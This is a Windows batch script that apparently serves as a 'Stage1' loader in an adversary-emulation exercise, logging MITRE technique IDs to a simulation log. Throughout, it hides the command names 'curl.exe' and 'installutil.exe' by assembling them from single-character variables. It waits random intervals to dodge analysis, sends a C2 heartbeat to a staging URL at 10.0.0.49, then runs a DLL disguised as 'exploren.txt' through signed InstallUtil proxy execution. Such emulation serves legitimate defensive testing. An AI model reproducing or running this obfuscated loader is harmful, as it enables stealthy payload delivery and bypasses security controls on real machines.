@echo off
SETLOCAL EnableDelayedExpansion

REM Random constant names with PHR_ as values
SET qwzxc=%APPDATA%\7990\7b699391
SET mnbvf=https://10.0.0.49
SET plkmj=https://10.0.0.49/stage/2/icon.png?7990-7
SET yhnbg=ITZEL-S2BO
SET vfrtg=7
SET xswqa=exploren.txt
SET okmji=7990

REM Setup logging paths
SET tlpdh=%APPDATA%\!vfrtg!
SET mswzc=%tlpdh%\macula-simulations.log
IF NOT EXIST "!tlpdh!" MD "!tlpdh!" >nul 2>&1

echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Initializing Stage1 DLL execution>>> "!mswzc!" 2>nul

REM Initial delay 30-60s using timeout
SET /A rdel=!RANDOM! %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Initial delay start !rdel!s>>> "!mswzc!" 2>nul
timeout /t !rdel! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Initial delay complete>>> "!mswzc!" 2>nul

REM Obfuscated curl command using nested variable indirection
SET zxcvb=c
SET qwert=ur
SET asdfg=l
SET yuiop=.exe
SET curlpart1=!zxcvb!!qwert!!asdfg!
SET curlref=!curlpart1!!yuiop!

REM Obfuscated installutil command using array-style variables
SET arr0=i
SET arr1=n
SET arr2=s
SET arr3=t
SET arr4=a
SET arr5=l
SET arr6=l
SET arr7=u
SET arr8=t
SET arr9=i
SET arr10=l
SET arr11=.exe
FOR /F %%i IN ('echo !arr0!!arr1!!arr2!!arr3!!arr4!!arr5!!arr6!!arr7!!arr8!!arr9!!arr10!!arr11!') DO SET instref=%%i

REM Obfuscated arguments using multiple indirection layers
SET arg0=/
SET arg1=l
SET arg2=o
SET arg3=g
SET arg4=f
SET arg5=i
SET arg6=l
SET arg7=e
SET arg8==
SET arg9=/
SET arg10=L
SET arg11=o
SET arg12=g
SET arg13=T
SET arg14=o
SET arg15=C
SET arg16=o
SET arg17=n
SET arg18=s
SET arg19=o
SET arg20=l
SET arg21=e
SET arg22==
SET arg23=f
SET arg24=a
SET arg25=l
SET arg26=s
SET arg27=e
SET arg28=/
SET arg29=U
CALL SET argpiece1=%%arg0%%arg1%%arg2%%arg3%%arg4%%arg5%%arg6%%arg7%%arg8%%
CALL SET argpiece2=%%arg9%%arg10%%arg11%%arg12%%arg13%%arg14%%arg15%%arg16%%arg17%%arg18%%arg19%%arg20%%arg21%%arg22%%arg23%%arg24%%arg25%%arg26%%arg27%%
CALL SET argpiece3=%%arg28%%arg29%%
SET argfull=!argpiece1!!argpiece2!!argpiece3!

REM Pre-heartbeat delay 5-15s using ping
SET /A pdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Pre-heartbeat delay !pdel!s>>> "!mswzc!" 2>nul
ping -n !pdel! 127.0.0.1 >nul

REM C2 heartbeat check with corrected implementation
echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Heartbeat check start>>> "!mswzc!" 2>nul
SET hbresult=0
SET hberror=

REM Execute curl with proper URL from https://10.0.0.49/stage/2/icon.png?7990-7 using indirect reference
CALL SET curlexe=%%curlref%%
!curlexe! -k -s -o nul --connect-timeout 30 --max-time 60 "!plkmj!"
IF !ERRORLEVEL! EQU 0 (
    SET hbresult=1
) ELSE (
    SET hberror=connection_failed_!ERRORLEVEL!
)

REM Format timestamp for TTP logging
FOR /F "tokens=1-3 delims=/- " %%a IN ("!DATE!") DO (
    SET yyyy=%%c
    SET mm=%%a
    SET dd=%%b
)
SET mm=0!mm!
SET dd=0!dd!
SET yyyy=!yyyy!
SET mm=!mm:~-2!
SET dd=!dd:~-2!
SET hms=!TIME!
IF "!hms:~1,1!"==":" SET hms=0!hms!
SET fullts=!yyyy!-!mm!-!dd! !hms!

REM Log TTP T1105 heartbeat result
echo [!fullts!][!yhnbg!]: !vfrtg!-!okmji!-T1105|Ingress Tool Transfer=!hbresult!:!hberror!>>> "!mswzc!" 2>&1

IF !hbresult! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Heartbeat failed, exiting>>> "!mswzc!" 2>nul
    EXIT /B 1
)

echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Heartbeat successful>>> "!mswzc!" 2>nul

REM Random delay 5-15s using CHOICE
SET /A cdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Pre-directory change delay !cdel!s>>> "!mswzc!" 2>nul
CHOICE /C Y /N /D Y /T !cdel! >nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Changing to directory !qwzxc!>>> "!mswzc!" 2>nul
CD /D "!qwzxc!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Directory change failed>>> "!mswzc!" 2>nul
    SET execresult=0
    SET exerror=path_not_found
    GOTO :logexec
)

REM Random delay 10-30s using timeout
SET /A rdelay=!RANDOM! %% 21 + 10
echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Random delay !rdelay!s before execution>>> "!mswzc!" 2>nul
timeout /t !rdelay! /nobreak >nul

REM Execute DLL via installutil with full .NET Framework path
echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Starting DLL execution>>> "!mswzc!" 2>nul
SET execresult=0
SET exerror=

REM Build full path to installutil using indirection
SET netpart1=%WINDIR%
SET netpart2=\Microsoft.NET\Framework64\v4.0.30319\
SET netpath=!netpart1!!netpart2!
CALL SET instexe=%%instref%%
SET fullinst=!netpath!!instexe!

REM Execute installutil with obfuscated arguments
echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Executing: !fullinst! !argfull!"!xswqa!" >>> "!mswzc!" 2>nul
!fullinst! !argfull!"!xswqa!"

IF !ERRORLEVEL! EQU 0 (
    SET execresult=1
) ELSE (
    SET exerror=assembly_load_failed_!ERRORLEVEL!
)

:logexec
REM Log TTP T1218 execution result
echo [!fullts!][!yhnbg!]: !vfrtg!-!okmji!-T1218|Signed Binary Proxy Execution=!execresult!:!exerror!>>> "!mswzc!" 2>&1

IF !execresult! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!yhnbg!]: DLL execution completed>>> "!mswzc!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!yhnbg!]: DLL execution failed: !exerror!>>> "!mswzc!" 2>nul
)

REM Final cleanup delay 5-15s using ping
SET /A fdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Final cleanup delay !fdel!s>>> "!mswzc!" 2>nul
ping -n !fdel! 127.0.0.1 >nul

echo [!DATE! !TIME!][DEBUG][!yhnbg!]: Stage1 complete>>> "!mswzc!" 2>nul

ENDLOCAL
EXIT /B 0